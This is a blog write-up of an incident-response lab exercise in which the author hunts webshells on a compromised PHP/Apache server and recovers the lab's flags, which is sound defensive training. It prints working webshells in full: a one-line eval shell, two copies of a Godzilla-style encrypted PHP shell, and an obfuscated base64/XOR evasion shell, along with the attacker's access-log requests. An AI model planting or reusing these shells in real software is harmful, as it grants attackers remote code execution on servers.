---
title: 第一章 应急响应-webshell查杀
author: hgbe02
date: 2024-06-13 18:15:08 +0800
categories: [Training platform,玄机应急响应]  
tags: [应急响应]  
permalink: "/xj/xjwebshell.html"
---

# webshell查杀

![image-20240613165712504](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202406131812881.png)

![image-20240613172420925](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202406131812883.png)

## 查看基础信息

```bash
root@ip-10-0-10-3:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-0-10-3:~# ls -la
total 44
drwx------  3 root root  4096 Aug  2  2023 .
drwxr-xr-x 18 root root  4096 Jun 13 09:23 ..
-rw-------  1 root root   147 Aug  2  2023 .bash_history
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
-rw-------  1 root root   645 Aug  2  2023 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 Nov 26  2022 .ssh
-rw-------  1 root root 10996 Aug  2  2023 .viminfo
-rw-r--r--  1 root root   209 Aug  2  2023 .wget-hsts
root@ip-10-0-10-3:~# cd /var/log
root@ip-10-0-10-3:/var/log# ls -la
total 4244
drwxr-xr-x  8 root  root   4096 Jun 13 09:23 .
drwxr-xr-x 12 root  root   4096 Aug  2  2023 ..
-rw-r--r--  1 root  root      0 Jun 13 09:23 alternatives.log
-rw-r--r--  1 root  root  33925 Aug  2  2023 alternatives.log.1
drwx------  3 root  root   4096 Aug  2  2023 amazon
drwxr-x---  2 root  adm    4096 Aug  2  2023 apache2
drwxr-xr-x  2 root  root   4096 Jun 13 09:23 apt
-rw-r-----  1 root  adm     393 Jun 13 09:24 auth.log
-rw-r-----  1 root  adm   23927 Jun 13 09:23 auth.log.1
-rw-r--r--  1 root  root    600 Aug  2  2023 aws114_ssm_agent_installation.log
-rw-r--r--  1 root  root 453632 Nov 18  2022 bootstrap.log
-rw-rw----  1 root  utmp      0 Jun 13 09:23 btmp
-rw-rw----  1 root  utmp      0 Nov 18  2022 btmp.1
-rw-r--r--  1 root  adm  949278 Jun 13 09:23 cloud-init.log
-rw-r-----  1 root  adm   38266 Jun 13 09:23 cloud-init-output.log
-rw-r-----  1 root  adm    6750 Jun 13 09:25 daemon.log
-rw-r-----  1 root  adm  305545 Jun 13 09:23 daemon.log.1
-rw-r-----  1 root  adm       0 Jun 13 09:23 debug
-rw-r-----  1 root  adm  111597 Jun 13 09:23 debug.1
-rw-r--r--  1 root  root      0 Jun 13 09:23 dpkg.log
-rw-r--r--  1 root  root 275700 Aug  2  2023 dpkg.log.1
-rw-r--r--  1 root  root  32032 Aug  2  2023 faillog
-rw-r-----  1 root  adm       0 Jun 13 09:23 kern.log
-rw-r-----  1 root  adm  533306 Jun 13 09:23 kern.log.1
-rw-rw-r--  1 root  utmp 292292 Jun 13 09:24 lastlog
-rw-r-----  1 root  adm     991 Jun 13 09:23 messages
-rw-r-----  1 root  adm  480831 Jun 13 09:23 messages.1
drwxr-s---  2 mysql adm    4096 Aug  2  2023 mysql
drwxr-xr-x  2 ntp   ntp    4096 Mar 21  2019 ntpstats
-rw-------  1 root  root   2154 Jun 13 09:23 php7.3-fpm.log
drwx------  2 root  root   4096 Nov 26  2022 private
-rw-r-----  1 root  adm    7895 Jun 13 09:25 syslog
-rw-r-----  1 root  adm  888469 Jun 13 09:23 syslog.1
-rw-r-----  1 root  adm     837 Jun 13 09:23 user.log
-rw-r-----  1 root  adm   41907 Aug  2  2023 user.log.1
-rw-rw-r--  1 root  utmp  46080 Jun 13 09:24 wtmp
root@ip-10-0-10-3:/var/log# ss -tulup
Netid         State          Recv-Q         Send-Q                                 Local Address:Port                    Peer Address:Port                                                                                                                                                            
udp           UNCONN         0              0                                            0.0.0.0:bootpc                       0.0.0.0:*             users:(("dhclient",pid=334,fd=7))                                                                                                                 
udp           UNCONN         0              0                                          10.0.10.3:ntp                          0.0.0.0:*             users:(("ntpd",pid=451,fd=19))                                                                                                                    
udp           UNCONN         0              0                                          127.0.0.1:ntp                          0.0.0.0:*             users:(("ntpd",pid=451,fd=18))                                                                                                                    
udp           UNCONN         0              0                                            0.0.0.0:ntp                          0.0.0.0:*             users:(("ntpd",pid=451,fd=17))                                                                                                                    
udp           UNCONN         0              0                      [fe80::dc:2ff:fe82:5464]%eth0:ntp                             [::]:*             users:(("ntpd",pid=451,fd=21))                                                                                                                    
udp           UNCONN         0              0                                              [::1]:ntp                             [::]:*             users:(("ntpd",pid=451,fd=20))                                                                                                                    
udp           UNCONN         0              0                                               [::]:ntp                             [::]:*             users:(("ntpd",pid=451,fd=16))                                                                                                                    
tcp           LISTEN         0              80                                         127.0.0.1:mysql                        0.0.0.0:*             users:(("mysqld",pid=558,fd=20))                                                                                                                  
tcp           LISTEN         0              128                                          0.0.0.0:ssh                          0.0.0.0:*             users:(("sshd",pid=505,fd=3))                                                                                                                     
tcp           LISTEN         0              128                                                *:http                               *:*             users:(("apache2",pid=629,fd=4),("apache2",pid=628,fd=4),("apache2",pid=625,fd=4),("apache2",pid=624,fd=4),("apache2",pid=623,fd=4),("apache2",pid=562,fd=4))
tcp           LISTEN         0              128                                             [::]:ssh                             [::]:*             users:(("sshd",pid=505,fd=4))
```

开启了Apache以及mysql

## 黑客webshell里面的flag

### 直接查找

进行查找：

```bash
root@ip-10-0-10-3:/var/log# cd /var/www/html
root@ip-10-0-10-3:/var/www/html# ls -la
total 88
drwxr-xr-x 8 www-data www-data  4096 Aug  2  2023 .
drwxr-xr-x 3 root     root      4096 Aug  2  2023 ..
drwxr-xr-x 3 www-data www-data  4096 Mar 14  2021 admin
-rwxr-xr-x 1 www-data www-data   280 Mar 14  2021 api.php
-rwxr-xr-x 1 www-data www-data   891 Aug  2  2023 config.php
drwxr-xr-x 3 www-data www-data  4096 Aug  2  2023 data
-rwxr-xr-x 1 www-data www-data   894 Mar 14  2021 favicon.ico
-rwxr-xr-x 1 www-data www-data   142 Aug  2  2023 .htaccess
drwxr-xr-x 4 www-data www-data  4096 Aug  2  2023 include
-rwxr-xr-x 1 www-data www-data   478 Mar 14  2021 index.php
-rwxr-xr-x 1 www-data www-data 12744 Mar 14  2021 install.php
-rw-r--r-- 1 www-data www-data  1080 Mar 14  2021 LICENSE
drwxr-xr-x 2 www-data www-data  4096 Aug  2  2023 pictures
-rw-r--r-- 1 www-data www-data  2235 Mar 14  2021 README.md
-rwxr-xr-x 1 www-data www-data  1049 Mar 14  2021 rss.php
-rw-r--r-- 1 www-data www-data    38 Aug  2  2023 shell.php
-rwxr-xr-x 1 www-data www-data   566 Mar 14  2021 sitemap.php
drwxr-xr-x 3 www-data www-data  4096 Mar 14  2021 template
drwxr-xr-x 3 www-data www-data  4096 Aug  2  2023 wap
root@ip-10-0-10-3:/var/www/html# cat shell.php
<?php phpinfo();@eval($_REQUEST[1]);?>root@ip-10-0-10-3:/var/www/html# find ./ -name "*.php" -type f 2>/dev/null
./admin/admin.php
./admin/index.php
./config.php
./include/gz.php
./include/Model/Api.php
./include/Model/Cms.php
./include/Model/Spider.php
./include/Model/User.php
./include/Model/Template.php
./include/Model/Config.php
./include/Model/Sql.php
./include/Model/Article.php
./include/Model/Datastore.php
./include/Model/Memcached.php
./include/Model/Upload.php
./include/Model/Link.php
./include/Model/File.php
./include/Model/Base.php
./include/Model/Category.php
./include/Model/Index.php
./include/Model/Comment.php
./include/Model/Admin.php
./include/Model/Frame.php
./include/Db/Sqlite.php
./include/Db/.Mysqli.php
./include/Db/Mysqli.php
./include/Db/Mysql.php
./include/common.php
./wap/index.php
./wap/top.php
./index.php
./sitemap.php
./shell.php
./data/tplcache/taoCMS/sidebar.php
./data/tplcache/taoCMS/index.php
./data/tplcache/taoCMS/category.php
./data/tplcache/taoCMS/header.php
./data/tplcache/taoCMS/footer.php
./data/tplcache/taoCMS/display.php
./data/tplcache/taoCMS/comments.php
./data/tplcache/wap_index.php
./data/tplcache/menu.php
./data/tplcache/editfile.php
./data/tplcache/managecomment.php
./data/tplcache/top.php
./data/tplcache/header.php
./data/tplcache/formsql.php
./data/tplcache/managelink.php
./data/tplcache/login.php
./data/tplcache/main.php
./data/tplcache/manageadmin.php
./data/tplcache/footer.php
./data/tplcache/managefile.php
./data/tplcache/adminframe.php
./rss.php
./api.php
./install.php
root@ip-10-0-10-3:/var/www/html# grep -pnir "eval"
grep: invalid option -- 'p'
Usage: grep [OPTION]... PATTERNS [FILE]...
Try 'grep --help' for more information.
root@ip-10-0-10-3:/var/www/html# grep -Pnir "eval"
admin/template/images/xheditor/xheditor-1.1.14-zh-cn.min.js:2:if(q){try{q=eval("("+q[1]+")")}catch(t){}h=e.extend({},q,h)}q=new ra(this,h);if(q.init())this.xheditor=q,o.push(q)}});0===o.length&&(o=!1);1===o.length&&(o=o[0]);return o};var aa=0,S=!1,sa=!0,ta=!1,Sa=!1,t,ba,ca,da,K,Ea,ea,Fa,Ga,Ha,A;e("script[src*=xheditor]").each(function(){var e=this.src;if(e.match(/xheditor[^\/]*\.js/i))return A=e.replace(/[\?#].*$/,"").replace(/(^|[\/\\])[^\/]*$/,"$1"),!1});if(h){try{document.execCommand("BackgroundImageCache",!1,!0)}catch(qb){}(I=e.fn.jquery)&&I.match(/^1\.[67]/)&&
admin/template/images/xheditor/xheditor-1.1.14-zh-cn.min.js:93:var h=e(".xheFile",i);h.change(function(){d.startUpload(h[0],b,c,f)});setTimeout(function(){a.closest(".xheDialog").bind("dragenter dragover",N).bind("drop",function(a){var a=a.originalEvent.dataTransfer,e;j&&a&&(e=a.files)&&0<e.length&&d.startUpload(e,b,c,f);return!1})},10)}};this.startUpload=function(a,b,c,f){function i(a,c){var e=Object,g=!1;try{e=eval("("+a+")")}catch(i){}e.err===$||e.msg===$?alert(b+" \u4e0a\u4f20\u63a5\u53e3\u53d1\u751f\u9519\u8bef\uff01\r\n\r\n\u8fd4\u56de\u7684\u9519\u8bef\u5185\u5bb9\u4e3a: \r\n\r\n"+
admin/template/images/xheditor/xheditor-1.1.14-zh-cn.min.js:99:n=r.name}catch(a){}}function l(a){r.document.write("");d.removeModal();null!=a&&c(a)}var b=e('<iframe frameborder="0" src="'+b.replace(/{editorRoot}/ig,A)+(/\?/.test(b)?"&":"?")+"parenthost="+location.host+'" style="width:100%;height:100%;display:none;" /><div class="xheModalIfmWait"></div>'),o=b.eq(0),s=b.eq(1);d.showModal(a,b,f,g,h);var r=o[0].contentWindow,n;j();o.load(function(){j();if(n){var a=!0;try{n=eval("("+unescape(n)+")")}catch(b){a=!1}if(a)return l(n)}s.is(":visible")&&(o.show().focus(),
admin/template/images/xheditor/jquery-1.4.4.min.js:20:e);if(e=e&&e.events){delete f.handle;f.events={};for(var h in e)for(var l in e[h])c.event.add(this,h,e[h][l],e[h][l].data)}}})}function Oa(a,b){b.src?c.ajax({url:b.src,async:false,dataType:"script"}):c.globalEval(b.text||b.textContent||b.innerHTML||"");b.parentNode&&b.parentNode.removeChild(b)}function oa(a,b,d){var e=b==="width"?a.offsetWidth:a.offsetHeight;if(d==="border")return e;c.each(b==="width"?Pa:Qa,function(){d||(e-=parseFloat(c.css(a,"padding"+this))||0);if(d==="margin")e+=parseFloat(c.css(a,
admin/template/images/xheditor/jquery-1.4.4.min.js:31:!F.call(j,"constructor")&&!F.call(j.constructor.prototype,"isPrototypeOf"))return false;for(var s in j);return s===B||F.call(j,s)},isEmptyObject:function(j){for(var s in j)return false;return true},error:function(j){throw j;},parseJSON:function(j){if(typeof j!=="string"||!j)return null;j=b.trim(j);if(C.test(j.replace(J,"@").replace(w,"]").replace(I,"")))return E.JSON&&E.JSON.parse?E.JSON.parse(j):(new Function("return "+j))();else b.error("Invalid JSON: "+j)},noop:function(){},globalEval:function(j){if(j&&
admin/template/images/xheditor/jquery-1.4.4.min.js:32:l.test(j)){var s=t.getElementsByTagName("head")[0]||t.documentElement,v=t.createElement("script");v.type="text/javascript";if(b.support.scriptEval)v.appendChild(t.createTextNode(j));else v.text=j;s.insertBefore(v,s.firstChild);s.removeChild(v)}},nodeName:function(j,s){return j.nodeName&&j.nodeName.toUpperCase()===s.toUpperCase()},each:function(j,s,v){var z,H=0,G=j.length,K=G===B||b.isFunction(j);if(v)if(K)for(z in j){if(s.apply(j[z],v)===false)break}else for(;H<G;){if(s.apply(j[H++],v)===false)break}else if(K)for(z in j){if(s.call(j[z],
admin/template/images/xheditor/jquery-1.4.4.min.js:39:scriptEval:false,noCloneEvent:true,boxModel:null,inlineBlockNeedsLayout:false,shrinkWrapBlocks:false,reliableHiddenOffsets:true};l.disabled=true;c.support.optDisabled=!k.disabled;b.type="text/javascript";try{b.appendChild(t.createTextNode("window."+e+"=1;"))}catch(o){}a.insertBefore(b,a.firstChild);if(E[e]){c.support.scriptEval=true;delete E[e]}try{delete b.test}catch(x){c.support.deleteExpando=false}a.removeChild(b);if(d.attachEvent&&d.fireEvent){d.attachEvent("onclick",function r(){c.support.noCloneEvent=
admin/template/images/xheditor/jquery-1.4.4.min.js:54:attr:function(a,b,d,e){if(!a||a.nodeType===3||a.nodeType===8)return B;if(e&&b in c.attrFn)return c(a)[b](d);e=a.nodeType!==1||!c.isXMLDoc(a);var f=d!==B;b=e&&c.props[b]||b;var h=Ta.test(b);if((b in a||a[b]!==B)&&e&&!h){if(f){b==="type"&&Ua.test(a.nodeName)&&a.parentNode&&c.error("type property can't be changed");if(d===null)a.nodeType===1&&a.removeAttribute(b);else a[b]=d}if(c.nodeName(a,"form")&&a.getAttributeNode(b))return a.getAttributeNode(b).nodeValue;if(b==="tabIndex")return(b=a.getAttributeNode("tabIndex"))&&
admin/template/images/xheditor/jquery-1.4.4.min.js:97:for(;u;){p.unshift(u);u=u.parentNode}for(u=m;u;){q.unshift(u);u=u.parentNode}n=p.length;m=q.length;for(u=0;u<n&&u<m;u++)if(p[u]!==q[u])return I(p[u],q[u]);return u===n?I(g,q[u],-1):I(p[u],i,1)};I=function(g,i,n){if(g===i)return n;for(g=g.nextSibling;g;){if(g===i)return-1;g=g.nextSibling}return 1}}k.getText=function(g){for(var i="",n,m=0;g[m];m++){n=g[m];if(n.nodeType===3||n.nodeType===4)i+=n.nodeValue;else if(n.nodeType!==8)i+=k.getText(n.childNodes)}return i};(function(){var g=t.createElement("div"),
admin/template/images/xheditor/jquery-1.4.4.min.js:98:i="script"+(new Date).getTime(),n=t.documentElement;g.innerHTML="<a name='"+i+"'/>";n.insertBefore(g,n.firstChild);if(t.getElementById(i)){o.find.ID=function(m,p,q){if(typeof p.getElementById!=="undefined"&&!q)return(p=p.getElementById(m[1]))?p.id===m[1]||typeof p.getAttributeNode!=="undefined"&&p.getAttributeNode("id").nodeValue===m[1]?[p]:B:[]};o.filter.ID=function(m,p){var q=typeof m.getAttributeNode!=="undefined"&&m.getAttributeNode("id");return m.nodeType===1&&q&&q.nodeValue===p}}n.removeChild(g);
admin/template/images/xheditor/jquery-1.4.4.min.js:104:c.contains=k.contains})();var Za=/Until$/,$a=/^(?:parents|prevUntil|prevAll)/,ab=/,/,Na=/^.[^:#\[\.,]*$/,bb=Array.prototype.slice,cb=c.expr.match.POS;c.fn.extend({find:function(a){for(var b=this.pushStack("","find",a),d=0,e=0,f=this.length;e<f;e++){d=b.length;c.find(a,this[e],b);if(e>0)for(var h=d;h<b.length;h++)for(var l=0;l<d;l++)if(b[l]===b[h]){b.splice(h--,1);break}}return b},has:function(a){var b=c(a);return this.filter(function(){for(var d=0,e=b.length;d<e;d++)if(c.contains(this,b[d]))return true})},
admin/template/images/xheditor/jquery-1.4.4.min.js:108:2,"previousSibling")},nextAll:function(a){return c.dir(a,"nextSibling")},prevAll:function(a){return c.dir(a,"previousSibling")},nextUntil:function(a,b,d){return c.dir(a,"nextSibling",d)},prevUntil:function(a,b,d){return c.dir(a,"previousSibling",d)},siblings:function(a){return c.sibling(a.parentNode.firstChild,a)},children:function(a){return c.sibling(a.firstChild)},contents:function(a){return c.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:c.makeArray(a.childNodes)}},function(a,
admin/template/images/xheditor/jquery-1.4.4.min.js:144:e=a.getResponseHeader("Etag");if(d)c.lastModified[b]=d;if(e)c.etag[b]=e;return a.status===304},httpData:function(a,b,d){var e=a.getResponseHeader("content-type")||"",f=b==="xml"||!b&&e.indexOf("xml")>=0;a=f?a.responseXML:a.responseText;f&&a.documentElement.nodeName==="parsererror"&&c.error("parsererror");if(d&&d.dataFilter)a=d.dataFilter(a,b);if(typeof a==="string")if(b==="json"||!b&&e.indexOf("json")>=0)a=c.parseJSON(a);else if(b==="script"||!b&&e.indexOf("javascript")>=0)c.globalEval(a);return a}});
include/gz.php:23:              eval($payload);
include/Db/.Mysqli.php:22:              eval($payload);
shell.php:1:<?php phpinfo();@eval($_REQUEST[1]);?>
template/taoCMS/images/tao.js:53:                       var resData=eval("["+xmlHttp.responseText+"]");
```

初步找到几个，尝试查看一下，在`gz.php`找到了一个flag：

```php
# root@ip-10-0-10-3:/var/www/html# cat include/gz.php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
//027ccd04-5065-48b6-a32d-77c704a5e26d
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
                eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

### D盾扫描

首先先对网站进行打包，可以用`SFTP`进行传输：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202406131812884.png" alt="image-20240613173747037" style="zoom:50%;" />

然后整个丢到D盾：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202406131812885.png" alt="image-20240613173808087" style="zoom:50%;" />

也可以找到！

```bash
flag{027ccd04-5065-48b6-a32d-77c704a5e26d}
```

## 黑客使用的什么工具的shell

分析一下这个木马，发现了一些弱特征

```php
@session_start();      	# 创建会话
@set_time_limit(0); 	# 连接时长不限
@error_reporting(0);	# 关掉错误报告
```

然后我直接搜了一下，发现哥斯拉的php马存在以下特征：

- `run()`方法是写死在攻击荷载里面的，代码一定会调用这个方法执行传入的参数。
- 有一个向`SESSION`中存储攻击荷载的过程。
- 会将传入的参数解密、拼接后取MD5，前16位加到回显的前端，其余的部分加到回显的后端（这里好像没有涉及到，这个特征还比较明显的）

然后上网找一下哥斯拉的项目位置：https://github.com/BeichenDream/Godzilla

```bash
root@ip-10-0-10-3:/var/www/html# echo -n 'https://github.com/BeichenDream/Godzilla' | md5sum
39392de3218c333f794befef07ac9257  -
```

得到第二个flag！

```bash
flag{39392de3218c333f794befef07ac9257}
```

## 黑客隐藏shell的完整路径的md5

这里猜隐藏应该就是前面找到的点开题的那个文件了，一样也有`eval`语句：

```bash
root@ip-10-0-10-3:/var/www/html# cd include/Db
root@ip-10-0-10-3:/var/www/html/include/Db# ls -la
total 36
drwxr-xr-x 2 www-data www-data 4096 Aug  2  2023 .
drwxr-xr-x 4 www-data www-data 4096 Aug  2  2023 ..
-rw-r--r-- 1 www-data www-data  768 Aug  2  2023 .Mysqli.php
-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php
-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php
-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php
root@ip-10-0-10-3:/var/www/html/include/Db# ls
Mysqli.php  Mysql.php  Sqlite.php
root@ip-10-0-10-3:/var/www/html/include/Db# cat .Mysqli.php
```

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
                eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

也是一个哥斯拉马，查看一下flag：

```bash
root@ip-10-0-10-3:/var/www/html/include/Db# pwd
/var/www/html/include/Db
root@ip-10-0-10-3:/var/www/html/include/Db# echo -n "/var/www/html/include/Db/.Mysqli.php" | md5sum
aebac0e58cd6c5fad1695ee4d1ac1919  -
```

flag即为：

```bash
flag{aebac0e58cd6c5fad1695ee4d1ac1919}
```

## 黑客免杀马完整路径

发现只剩下一个了，去瞅瞅是不是这个：

![image-20240613175439848](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202406131812886.png)

```bash
<?php

$key = "password";

//ERsDHgEUC1hI
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($fun);
```

发现进行了一个base64编码进行免杀的，那么这里的完整地址就应该是`/var/www/html/wap/top.php`，其flag应该为：

```bash
flag{EEFF2EABFD9B7A6D26FC1A53D3F7D1DE}
```

也看到[gddfeng师傅](https://blog.gddfeng.com/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E7%8E%84%E6%9C%BA/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC%E4%B8%80%E7%AB%A0/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/)查看`access.log`日志发现了有执行记录，这也是一个发现思路：

```bash
192.168.200.2 - - [02/Aug/2023:08:55:49 +0000] "POST /shell.php HTTP/1.1" 200 26120 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0"
192.168.200.2 - - [02/Aug/2023:08:55:49 +0000] "POST /shell.php HTTP/1.1" 200 26230 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
192.168.200.2 - - [02/Aug/2023:08:55:49 +0000] "POST /shell.php HTTP/1.1" 200 26154 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
192.168.200.2 - - [02/Aug/2023:08:55:49 +0000] "POST /shell.php HTTP/1.1" 200 26171 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36"
192.168.200.2 - - [02/Aug/2023:08:56:10 +0000] "GET /wap/top.php?fuc=ERsDHgEUC1hI&func2=ser HTTP/1.1" 500 185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
192.168.200.2 - - [02/Aug/2023:08:56:24 +0000] "GET /wap/top.php?fuc=ERsDHgEUC1hI&func2=sert HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
192.168.200.2 - - [02/Aug/2023:08:56:29 +0000] "POST /shell.php HTTP/1.1" 200 26126 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1"
192.168.200.2 - - [02/Aug/2023:08:56:29 +0000] "POST /shell.php HTTP/1.1" 200 26154 "-" "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0"
192.168.200.2 - - [02/Aug/2023:08:56:36 +0000] "POST /shell.php HTTP/1.1" 200 27109 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)"
192.168.200.2 - - [02/Aug/2023:08:56:38 +0000] "POST /shell.php HTTP/1.1" 200 27053 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
192.168.200.2 - - [02/Aug/2023:08:56:39 +0000] "POST /shell.php HTTP/1.1" 200 27028 "-" "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko"
192.168.200.2 - - [02/Aug/2023:08:56:39 +0000] "POST /shell.php HTTP/1.1" 200 27080 "-" "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00"
192.168.200.2 - - [02/Aug/2023:08:56:42 +0000] "POST /shell.php HTTP/1.1" 200 27017 "-" "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0"
192.168.200.2 - - [02/Aug/2023:08:56:42 +0000] "POST /shell.php HTTP/1.1" 200 27032 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0"
192.168.200.2 - - [02/Aug/2023:08:56:49 +0000] "POST /shell.php HTTP/1.1" 200 27164 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
192.168.200.2 - - [02/Aug/2023:08:56:53 +0000] "POST /shell.php HTTP/1.1" 200 27193 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
192.168.200.2 - - [02/Aug/2023:08:57:25 +0000] "POST /shell.php HTTP/1.1" 200 26078 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)"
192.168.200.2 - - [02/Aug/2023:08:59:28 +0000] "POST /shell.php HTTP/1.1" 200 26438 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
```

这是随便截取的一点，进行简单处理：

```bash
root@ip-10-0-10-1:/var/log/apache2# cat access.log | awk '{print $7}' | sort | uniq
/
/1.php
/admin
/admin/
/admin/admin.php
/admin/admin.php?action=admin&ctrl=lists
/admin/admin.php?action=comment&ctrl=lists
/admin/admin.php?action=file&ctrl=edit&path=./shell.php
/admin/admin.php?action=file&ctrl=edit&path=shell.php
/admin/admin.php?action=file&ctrl=lists
/admin/admin.php?action=file&ctrl=lists&path=.
/admin/admin.php?action=frame&ctrl=iframes
/admin/admin.php?action=frame&ctrl=login
/admin/admin.php?action=frame&ctrl=main
/admin/admin.php?action=frame&ctrl=menu
/admin/admin.php?action=frame&ctrl=top
/admin/admin.php?action=link&ctrl=lists
/admin/admin.php?action=sql&ctrl=display
/admin/admin.php?path=&action=file&ctrl=create&isdir=0&name=&fbtn=%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6
/admin/admin.php?path=&action=file&ctrl=create&isdir=0&name=shell.php&fbtn=%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6
/adminer.php
/adminer.php?file=default.css&version=4.7.2
/adminer.php?file=favicon.ico&version=4.7.2
/adminer.php?file=functions.js&version=4.7.2
/adminer.php?file=jush.js&version=4.7.2
/adminer.php?script=version
/adminer.php?username=root
/adminer.php?username=root&db=mysql
/adminer.php?username=root&db=mysql&script=db
/admin/template/images/common.css
/admin/template/images/common.js
/admin/template/images/mainnavbg.gif
/admin/template/images/sub_arrow.gif
/admin/template/images/tinyeditor.js
/api.php?action=comment&ctrl=code
/?cat=1
/data/tplcache/top.php
/data/tplcache/top.php?1=phpinfo();
//favicon.ico
/favicon.ico
/?id=1
/install.php
/shell.php
/template/taoCMS/images/addthis.gif
/template/taoCMS/images/dot.gif
/template/taoCMS/images/logo.gif
/template/taoCMS/images/style.css
/template/taoCMS/images/tao.js
/template/taoCMS/images/tip.gif
/wap/index.php?1=phpinfo();
/wap/template/images/logo.gif
/wap/template/images/mobile.css
/wap/template/images/time.gif
/wap/top.php?1=phpinfo();
/wap/top.php?fuc=ERsDHgEUC1hI&func2=ser
/wap/top.php?fuc=ERsDHgEUC1hI&func2=sert
```

同样找到了免杀马。